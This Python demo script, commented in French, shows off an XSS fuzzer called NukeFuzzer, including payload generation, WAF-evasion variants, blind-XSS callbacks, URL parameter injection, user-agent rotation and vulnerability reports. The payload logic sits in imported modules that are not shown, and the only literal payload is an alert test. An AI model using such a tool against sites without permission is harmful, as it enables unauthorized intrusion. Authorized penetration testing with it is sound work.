#!/usr/bin/env python3
"""
Exemple d'utilisation avancée de NukeFuzzer v2.0
Démonstration des techniques XSS les plus avancées
"""

import sys
import os
import asyncio
from typing import List, Dict, Any

# Ajout du répertoire courant au path
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

# Import des modules avancés
from advanced_payloads import AdvancedXSSPayloads
from advanced_techniques import AdvancedTechniques, get_waf_bypass_variants
from session_manager import AdvancedHTTPClient, AdvancedXSSScanner
from config import load_advanced_config

def demo_payload_generation():
    """Démonstration de la génération de payloads avancés"""
    print("🎯 === GÉNÉRATION DE PAYLOADS AVANCÉS ===")
    
    generator = AdvancedXSSPayloads()
    
    # Payloads basiques
    print("\n1. Payloads XSS basiques:")
    for i, payload in enumerate(generator.basic_payloads[:5], 1):
        print(f"   {i}. {payload}")
    
    # Payloads contextuels
    print("\n2. Payloads contextuels:")
    contexts = ['html', 'javascript', 'attribute', 'url']
    for context in contexts:
        payload = generator.generate_context_aware_payload(context)
        print(f"   {context.upper()}: {payload}")
    
    # Payloads avec évasion WAF
    print("\n3. Payloads avec évasion WAF:")
    base_payload = '<script>alert("XSS")</script>'
    techniques = ['case_variation', 'encoding_variation', 'javascript_obfuscation']
    for technique in techniques:
        evaded = generator.apply_waf_bypass(base_payload, technique)
        print(f"   {technique}: {evaded}")
    
    # Payloads polyglot
    print("\n4. Payloads polyglot:")
    for i, payload in enumerate(generator.polyglot_payloads[:3], 1):
        print(f"   {i}. {payload[:80]}...")
    
    # Blind XSS
    print("\n5. Blind XSS:")
    blind_payloads = generator.generate_blind_xss_payloads("callback.example.com", 3)
    for i, payload in enumerate(blind_payloads, 1):
        print(f"   {i}. {payload[:80]}...")
    
    # Encodages multiples
    print("\n6. Encodages multiples:")
    test_payload = '<script>alert("XSS")</script>'
    encoded = generator.generate_encoded_payloads(test_payload)
    encodings = ['URL', 'HTML', 'Unicode', 'Base64', 'Hex']
    for i, (encoding, payload) in enumerate(zip(encodings, encoded[:5]), 1):
        print(f"   {encoding}: {payload[:60]}...")

def demo_waf_evasion():
    """Démonstration des techniques d'évasion WAF"""
    print("\n🛡️ === TECHNIQUES D'ÉVASION WAF ===")
    
    techniques = AdvancedTechniques()
    base_payload = '<script>alert("XSS")</script>'
    
    # Génération de variantes d'évasion
    print("\n1. Variantes d'évasion automatiques:")
    variants = get_waf_bypass_variants(base_payload, 5)
    for i, variant in enumerate(variants, 1):
        print(f"   {i}. {variant}")
    
    # Techniques spécifiques
    print("\n2. Techniques spécifiques:")
    specific_techniques = [
        'case_variation',
        'space_variation', 
        'comment_insertion',
        'encoding_variation',
        'javascript_obfuscation'
    ]
    
    for technique in specific_techniques:
        try:
            method = getattr(techniques.waf_evasion, f'apply_{technique}')
            result = method(base_payload)
            print(f"   {technique}: {result}")
        except AttributeError:
            print(f"   {technique}: Technique non disponible")
    
    # Détection de WAF
    print("\n3. Détection de WAF:")
    sample_headers = {
        'server': 'cloudflare',
        'cf-ray': '12345',
        'x-amz-cf-id': 'test'
    }
    detected_waf = techniques.detect_waf(sample_headers, "")
    print(f"   WAF détecté: {detected_waf}")

def demo_context_analysis():
    """Démonstration de l'analyse contextuelle"""
    print("\n🔍 === ANALYSE CONTEXTUELLE ===")
    
    techniques = AdvancedTechniques()
    
    # Différents contextes de test
    test_cases = [
        {
            'name': 'HTML Context',
            'response': '<html><body><div>USER_INPUT</div></body></html>',
            'payload': 'USER_INPUT'
        },
        {
            'name': 'JavaScript Context',
            'response': '<script>var x = "USER_INPUT"; alert(x);</script>',
            'payload': 'USER_INPUT'
        },
        {
            'name': 'Attribute Context',
            'response': '<input type="text" value="USER_INPUT">',
            'payload': 'USER_INPUT'
        },
        {
            'name': 'URL Context',
            'response': '<a href="https://example.com/page?param=USER_INPUT">Link</a>',
            'payload': 'USER_INPUT'
        }
    ]
    
    print("\n1. Détection de contexte:")
    for test_case in test_cases:
        analysis = techniques.analyze_response_for_xss(
            test_case['response'], test_case['payload']
        )
        print(f"   {test_case['name']}: {analysis['context']} (confiance: {analysis['confidence']}%)")
    
    # Génération de payloads contextuels
    print("\n2. Payloads contextuels générés:")
    for context in ['html', 'javascript', 'attribute', 'url']:
        payloads = techniques.generate_context_specific_payloads(context, 2)
        print(f"   {context.upper()}:")
        for payload in payloads:
            print(f"      → {payload}")

def demo_advanced_scanning():
    """Démonstration du scan avancé"""
    print("\n🚀 === SCANNING AVANCÉ ===")
    
    # Configuration avancée
    config = load_advanced_config()
    
    # Scanner avec configuration personnalisée
    scanner_config = {
        'max_workers': 5,
        'timeout': 10,
        'requests_per_second': 5,
        'rotate_user_agents': True
    }
    
    scanner = AdvancedXSSScanner(scanner_config)
    
    print("\n1. Configuration du scanner:")
    print(f"   Max workers: {scanner_config['max_workers']}")
    print(f"   Timeout: {scanner_config['timeout']}s")
    print(f"   Rate limit: {scanner_config['requests_per_second']} req/s")
    print(f"   User-Agent rotation: {scanner_config['rotate_user_agents']}")
    
    # Génération de payloads personnalisés
    generator = AdvancedXSSPayloads()
    custom_payloads = generator.generate_all_payloads(20)
    
    print(f"\n2. Payloads générés: {len(custom_payloads)}")
    print("   Échantillon:")
    for i, payload in enumerate(custom_payloads[:5], 1):
        print(f"   {i}. {payload}")
    
    # Simulation d'analyse d'URL
    test_urls = [
        'https://httpbin.org/get?test=value',
        'https://httpbin.org/post',
        'https://httpbin.org/headers'
    ]
    
    print(f"\n3. URLs de test: {len(test_urls)}")
    for url in test_urls:
        print(f"   → {url}")

def demo_http_client():
    """Démonstration du client HTTP avancé"""
    print("\n🌐 === CLIENT HTTP AVANCÉ ===")
    
    # Configuration du client
    client_config = {
        'timeout': 10,
        'rotate_user_agents': True,
        'requests_per_second': 5,
        'follow_redirects': True
    }
    
    client = AdvancedHTTPClient(client_config)
    
    print("\n1. Configuration du client HTTP:")
    for key, value in client_config.items():
        print(f"   {key}: {value}")
    
    # Démonstration d'injection de payload
    test_url = "https://httpbin.org/get?search=test&category=all"
    test_payload = '<script>alert("XSS")</script>'
    
    injected_url = client.inject_payload_in_url(test_url, test_payload)
    print(f"\n2. Injection de payload:")
    print(f"   URL originale: {test_url}")
    print(f"   Payload: {test_payload}")
    print(f"   URL injectée: {injected_url}")
    
    # Techniques d'injection
    print("\n3. Techniques d'injection supportées:")
    techniques = [
        'Paramètres GET',
        'Données POST',
        'Headers HTTP',
        'Cookies',
        'Données JSON',
        'Méthodes HTTP multiples'
    ]
    
    for technique in techniques:
        print(f"   ✓ {technique}")

def demo_reporting():
    """Démonstration du système de reporting"""
    print("\n📊 === SYSTÈME DE REPORTING ===")
    
    # Simulation de résultats
    from session_manager import RequestResult
    
    # Création de résultats simulés
    results = [
        RequestResult(
            url="https://example.com/search?q=test",
            method="GET",
            status_code=200,
            response_body="<div>test</div>",
            response_headers={"content-type": "text/html"},
            response_time=0.5,
            payload='<script>alert("XSS")</script>',
            vulnerable=True,
            vulnerability_type="reflected",
            confidence=85,
            evidence=["Payload reflected in HTML context"]
        ),
        RequestResult(
            url="https://example.com/comment",
            method="POST",
            status_code=200,
            response_body="<script>alert('XSS')</script>",
            response_headers={"content-type": "text/html"},
            response_time=0.8,
            payload='<script>alert("XSS")</script>',
            vulnerable=True,
            vulnerability_type="stored",
            confidence=95,
            evidence=["Payload stored and executed"]
        ),
        RequestResult(
            url="https://example.com/api/data",
            method="GET",
            status_code=200,
            response_body="{}",
            response_headers={"content-type": "application/json"},
            response_time=0.3,
            payload='<script>alert("XSS")</script>',
            vulnerable=False,
            confidence=0,
            evidence=[]
        )
    ]
    
    # Génération de rapport
    scanner = AdvancedXSSScanner()
    report = scanner.generate_report(results)
    
    print("\n1. Statistiques du scan:")
    print(f"   Total de requêtes: {report['total_requests']}")
    print(f"   Requêtes vulnérables: {report['vulnerable_requests']}")
    print(f"   Taux de vulnérabilité: {report['vulnerability_rate']:.1f}%")
    
    print("\n2. Vulnérabilités par type:")
    for vuln_type, count in report['vulnerabilities_by_type'].items():
        print(f"   {vuln_type}: {count}")
    
    print("\n3. Classification par confiance:")
    print(f"   Confiance élevée (≥80%): {len(report['high_confidence_vulnerabilities'])}")
    print(f"   Confiance moyenne (≥50%): {len(report['medium_confidence_vulnerabilities'])}")
    print(f"   Confiance faible (<50%): {len(report['low_confidence_vulnerabilities'])}")

def demo_configuration():
    """Démonstration du système de configuration"""
    print("\n⚙️ === SYSTÈME DE CONFIGURATION ===")
    
    config = load_advanced_config()
    
    print("\n1. Configuration générale:")
    general_config = config.get('general')
    for key, value in general_config.items():
        print(f"   {key}: {value}")
    
    print("\n2. Configuration XSS:")
    xss_config = config.get('xss')
    important_keys = ['payload_count', 'use_advanced_payloads', 'waf_bypass_techniques']
    for key in important_keys:
        if key in xss_config:
            print(f"   {key}: {xss_config[key]}")
    
    print("\n3. Configuration WAF bypass:")
    waf_config = config.get('waf_bypass')
    for key, value in waf_config.items():
        if key != 'custom_headers':  # Éviter l'affichage des headers
            print(f"   {key}: {value}")
    
    print("\n4. User-Agents disponibles:")
    user_agents = config.get('user_agents', [])
    print(f"   Nombre: {len(user_agents)}")
    for i, ua in enumerate(user_agents[:3], 1):
        print(f"   {i}. {ua[:60]}...")

def main():
    """Fonction principale de démonstration"""
    print("🚀 NukeFuzzer v2.0 Advanced - Démonstration Complète")
    print("=" * 70)
    
    demonstrations = [
        ("Génération de Payloads", demo_payload_generation),
        ("Évasion WAF", demo_waf_evasion),
        ("Analyse Contextuelle", demo_context_analysis),
        ("Scanning Avancé", demo_advanced_scanning),
        ("Client HTTP", demo_http_client),
        ("Reporting", demo_reporting),
        ("Configuration", demo_configuration)
    ]
    
    for name, demo_func in demonstrations:
        try:
            demo_func()
            print(f"\n✅ {name}: Démonstration réussie")
        except Exception as e:
            print(f"\n❌ {name}: Erreur - {e}")
        
        print("-" * 70)
    
    print("\n🎉 Démonstration terminée!")
    print("\nNukeFuzzer v2.0 Advanced est prêt à découvrir des vulnérabilités XSS")
    print("avec des techniques d'évasion de pointe!")
    
    print("\n📚 Ressources:")
    print("   • README.md - Documentation complète")
    print("   • test_nukefuzzer.py - Tests complets")
    print("   • NukeFuzzer.py - Script principal")
    print("   • GitHub - https://github.com/Youns92/NukeFuzzer")
    
    print("\n⚠️  Rappel: Utilisez cet outil uniquement sur des domaines autorisés!")

if __name__ == "__main__":
    main()